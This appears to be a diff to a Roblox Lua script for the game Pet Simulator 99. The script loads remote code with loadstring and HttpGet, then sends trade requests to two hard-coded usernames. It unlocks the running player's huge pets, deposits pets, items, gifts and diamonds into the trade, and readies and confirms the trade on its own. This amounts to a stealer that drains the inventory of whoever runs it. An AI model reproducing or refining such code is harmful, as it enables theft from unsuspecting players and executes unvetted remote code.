@@ -2,6 +2,7 @@
 wait(5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-99/main/waitForGameLoad.lua"))()
 if game.PlaceId == 8737899170 then
+    getgenv().PeopleForTrade = {"TrickyThyClown_6", "REyifpof"}
     getgenv().PetToTrade = {
         --{Pet = "Elegant Eagle", Patern = all, DecrementBy = 0},
         --{Pet = "Luxe Axolotl", Patern = all, DecrementBy = 0}
@@ -43,10 +44,9 @@ if game.PlaceId == 8737899170 then
         "Rave Gift",
         "Millionaire Bucks"
 }
-
-    local library = require(game.ReplicatedStorage.Library)
-    local save = library.Save.Get()
-    local inventory = library.Save.Get().Inventory
+    local const = require(game.ReplicatedStorage.Library.Directory)
+    local library = require(game.ReplicatedStorage.Library.Client.Save)
+    local save = library.Get()
 
     local function GetTradeID()
         return require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()._id
@@ -57,41 +57,53 @@ if game.PlaceId == 8737899170 then
     end
 
     local function SendTrade()
-        local args = {
-            [1] = game:GetService("Players"):WaitForChild("REyifpof")
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Request"):InvokeServer(unpack(args))
-        wait(1)
-        local args = {
-            [1] = game:GetService("Players"):WaitForChild("TrickyThyClown_6")
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Request"):InvokeServer(unpack(args))
 
+        for _, Nick in pairs(getgenv().PeopleForTrade) do
+            if game:GetService("Players"):FindFirstChild(Nick) ~= nil then
+                local args = {
+                    [1] = game:GetService("Players"):WaitForChild(Nick)
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Request"):InvokeServer(unpack(args))
+
+            else
+                print("People" ..  Nick  .. "Not Found")
+            end
+                
+        end
     end
 
     local function ReadyTrade()
-        wait(3.5)
-        local args = {
-            [1] = GetTradeID(),
-            [2] = true,
-            [3] = GetCounter()
-        }
-        
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Ready"):InvokeServer(unpack(args))
+        if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
+            wait(3.5)
+            if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
+                local args = {
+                    [1] = GetTradeID(),
+                    [2] = true,
+                    [3] = GetCounter()
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Ready"):InvokeServer(unpack(args))
+            else
+                print("Trade Cancelled on Ready")
+            end
+        end
     end
 
     local function ConfirmTrade()
-        repeat
+        while game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil do
             wait(1)
-            local args = {
-                [1] = GetTradeID(),
-                [2] = true,
-                [3] = GetCounter()
-            }
-            
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Confirmed"):InvokeServer(unpack(args))
-
-        until game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == false
+            if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
+                local args = {
+                    [1] = GetTradeID(),
+                    [2] = true,
+                    [3] = GetCounter()
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Confirmed"):InvokeServer(unpack(args))
+            else
+                print("Trade Cancelled on Confirm")
+            end
+        end
 
     end
     
@@ -99,8 +111,8 @@ if game.PlaceId == 8737899170 then
     local function UnlockPet()
         if save.Inventory.Pet ~= nil then
             for i,v in pairs(save.Inventory.Pet) do
-                id = v.id
-                dir = library.Directory.Pets[id]
+                local id = v.id
+                local dir = const.Pets[id]
                 if dir.huge then
                     local args = {
                         [1] = i,
@@ -153,8 +165,8 @@ if game.PlaceId == 8737899170 then
     local function DepositPetInTrade()
         if save.Inventory.Pet ~= nil then
             for i,v in pairs(save.Inventory.Pet) do
-                id = v.id
-                dir = library.Directory.Pets[id]
+                local id = v.id
+                local dir = const.Pets[id]
                 if dir.huge then
                     wait(0.1)
                     local args = {
@@ -216,7 +228,7 @@ if game.PlaceId == 8737899170 then
 
     local function DepositGiftInTrade()
         if save.Inventory.Lootbox ~= nil then
-            for i,v in pairs(inventory.Lootbox) do
+            for i,v in pairs(save.Inventory.Lootbox) do
                 if v._am ~= nil then
                     for _, itemName in pairs(getgenv().ItemToTrade) do
                         if v.id == itemName then
@@ -252,25 +264,29 @@ if game.PlaceId == 8737899170 then
         end
     end
 
+    local function MakeTrade()
+        local StatusTrade = true
+        while StatusTrade do
+            wait(1)
+                UnlockPet()
+                SendTrade()
 
-    while true do
-        wait(1)
-        if game:GetService("Players"):WaitForChild("REyifpof") ~= nil then
-            UnlockPet()
-            SendTrade()
-        end
-        if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
-            DepositPetInTrade()
-            DepositStatPetInTrade()
-            DepositItemInTrade()
-            DepositSeedInTrade()
-            DepositGiftInTrade()
-            DepositDiamondsInTrade()
-            ReadyTrade()
-            wait(1)
-            ConfirmTrade()
-            wait(1)
+            if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
+                DepositPetInTrade()
+                DepositStatPetInTrade()
+                DepositItemInTrade()
+                DepositSeedInTrade()
+                DepositGiftInTrade()
+                DepositDiamondsInTrade()
+                ReadyTrade()
+                wait(1)
+                ConfirmTrade()
+                StatusTrade = false
+                wait()
+            end
         end
     end
+
+    MakeTrade()
 end
 
